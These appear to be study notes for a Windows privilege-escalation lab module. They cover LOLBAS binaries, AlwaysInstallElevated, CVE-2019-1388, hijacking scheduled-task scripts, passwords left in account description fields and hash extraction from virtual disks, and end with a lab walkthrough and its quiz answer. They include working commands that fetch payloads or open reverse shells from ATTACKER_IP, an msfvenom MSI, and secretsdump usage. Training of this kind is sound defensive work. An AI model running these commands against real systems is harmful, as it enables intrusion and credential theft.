# Section 27 — Miscellaneous Techniques

> **Lab: yes** — RDP to target, find cleartext password stored in a user account description field.

**Core principle:** Windows has many overlooked places where credentials or escalation opportunities hide: LOLBAS binaries, user description fields, scheduled tasks with weak permissions, AlwaysInstallElevated MSI installs, CVE-2019-1388, and virtual disk files containing SAM hives.

---

## LOLBAS (Living Off the Land Binaries and Scripts)

Microsoft-signed binaries with unexpected functionality useful for attackers. Full catalog at https://lolbas-project.github.io/

### Key LOLBAS examples

| Binary | Offensive Use |
|--------|--------------|
| **certutil.exe** | File download, base64 encode/decode |
| **rundll32.exe** | Execute DLLs (reverse shell via SMB-hosted DLL) |
| **mshta.exe** | Execute HTA files (code execution) |
| **regsvr32.exe** | Execute scriptlets (AppLocker bypass) |
| **bitsadmin.exe** | File download |
| **msiexec.exe** | Install MSI from UNC/URL (code execution) |

### certutil — file transfer

```cmd
certutil.exe -urlcache -split -f http://ATTACKER_IP:8080/shell.bat shell.bat
```
> Downloads a file from attacker's HTTP server to disk.

### certutil — base64 encode/decode

```cmd
certutil -encode file1 encodedfile
certutil -decode encodedfile file2
```
> Useful for transferring binary files through text-only channels.

### rundll32 — execute DLL from SMB share

```cmd
rundll32.exe \\ATTACKER_IP\share\payload.dll,0
```
> Executes a DLL hosted on your SMB server. Combine with smbserver.py.

---

## AlwaysInstallElevated

When enabled, ANY user can install .msi packages with SYSTEM privileges.

### Check if enabled

```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
> Both must return `0x1` for the attack to work.

### Generate malicious MSI (reverse shell)

```bash
msfvenom -p windows/shell_reverse_tcp lhost=ATTACKER_IP lport=9443 -f msi > aie.msi
```
> Creates an MSI that sends a reverse shell when installed.

### Execute on target

```cmd
msiexec /i c:\path\to\aie.msi /quiet /qn /norestart
```
> `/quiet /qn /norestart` = silent install, no UI, no reboot. Shell comes back as SYSTEM.

---

## CVE-2019-1388 — UAC certificate dialog privesc

Affects unpatched Windows systems before November 2019. Exploits a hyperlink in the certificate dialog that opens a browser as SYSTEM.

### Steps

```
1. Right-click hhupd.exe → Run as administrator
2. Click "Show information about the publisher's certificate"
3. Go to General tab → click the "Issued by" hyperlink (VeriSign URL)
4. Browser opens as SYSTEM (verify in Task Manager)
5. Right-click page → View page source → opens new tab
6. Right-click again → Save as → Save As dialog opens
7. Type C:\Windows\System32\cmd.exe in the file path → Enter
8. cmd.exe spawns as SYSTEM
```
> Requires GUI access. Browser opens as SYSTEM because the UAC dialog runs in a privileged context.

---

## Scheduled tasks

### Enumerate scheduled tasks

```cmd
schtasks /query /fo LIST /v
```

```powershell
Get-ScheduledTask | select TaskName, State
```

### Look for writable script directories

```cmd
accesschk64.exe /accepteula -s -d C:\Scripts\
```
> If `BUILTIN\Users` has RW access to a scripts directory that contains scheduled task scripts (db-backup.ps1, etc.), append your payload to one of them.

### Exploitation

If a script runs as SYSTEM on a schedule and you can write to it:

```powershell
# Append reverse shell to the script
echo "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/shell.ps1')" >> C:\Scripts\db-backup.ps1
```
> Wait for the scheduled task to execute. Your appended code runs as SYSTEM.

---

## User/Computer description fields

Sysadmins sometimes store passwords in account description fields, readable by any authenticated user.

### Check local user descriptions

```powershell
Get-LocalUser | select Name, Enabled, Description | fl
```
> Look for passwords in the Description field (e.g., "Network scanner - do not change password: P@ssw0rd!").

### Check computer description

```powershell
Get-WmiObject -Class Win32_OperatingSystem | select Description
```

---

## Mounting VHD/VHDX/VMDK files

Virtual disk files found on network shares or backup locations may contain entire OS installations with SAM/SYSTEM hives.

### Mount on Linux

```bash
# VMDK
guestmount -a SQL01-disk1.vmdk -i --ro /mnt/vmdk

# VHD/VHDX
guestmount --add WEBSRV10.vhdx --ro /mnt/vhdx/ -m /dev/sda1
```

### Extract hashes

```bash
secretsdump.py -sam /mnt/vhdx/Windows/System32/Config/SAM -security /mnt/vhdx/Windows/System32/Config/SECURITY -system /mnt/vhdx/Windows/System32/Config/SYSTEM LOCAL
```
> Mount read-only, navigate to System32\Config, dump hashes with secretsdump.

### On Windows

Right-click VHD/VHDX → Mount (or Disk Management → Attach VHD). For VMDK, use VMware or 7-Zip to extract.

---

## Lab walkthrough

**Target:** `<TARGET_IP>` (ACADEMY-WINLPE-SRV01)
**RDP Creds:** `htb-student` / `HTB_@cademy_stdnt!`

### Attack chain

```
STEP 1: CONNECT
───────────────
1. RDP to target
   xfreerdp3 /cert:ignore /dynamic-resolution +clipboard /compression /v:<TARGET_IP> /u:htb-student /p:'HTB_@cademy_stdnt!'

STEP 2: ENUMERATE USER DESCRIPTIONS
────────────────────────────────────
2. Check all local user descriptions
   powershell -c "Get-LocalUser | select Name, Enabled, Description | fl"
   → secsvc account has password in Description field:
     "Network scanner - do not change password: !QAZXSW@3edc"

   Q1 answer: !QAZXSW@3edc
```

---

## Key takeaways

- **LOLBAS binaries are pre-installed and Microsoft-signed.** certutil, rundll32, mshta, regsvr32 — all bypass application whitelisting.
- **Always check user description fields.** `Get-LocalUser` reveals passwords lazy admins stored in the Description field — any authenticated user can read them.
- **AlwaysInstallElevated is instant SYSTEM.** Both HKCU and HKLM keys set to 1 = msfvenom MSI + msiexec = SYSTEM shell.
- **CVE-2019-1388 gives SYSTEM via GUI.** Unpatched pre-Nov 2019 systems — hhupd.exe certificate dialog → browser as SYSTEM → cmd.exe.
- **Writable scheduled task scripts are rare but devastating.** Check C:\Scripts\ and similar directories with accesschk.
- **Virtual disk files on shares = offline hash extraction.** Mount VHD/VHDX/VMDK, pull SAM/SYSTEM, dump with secretsdump.
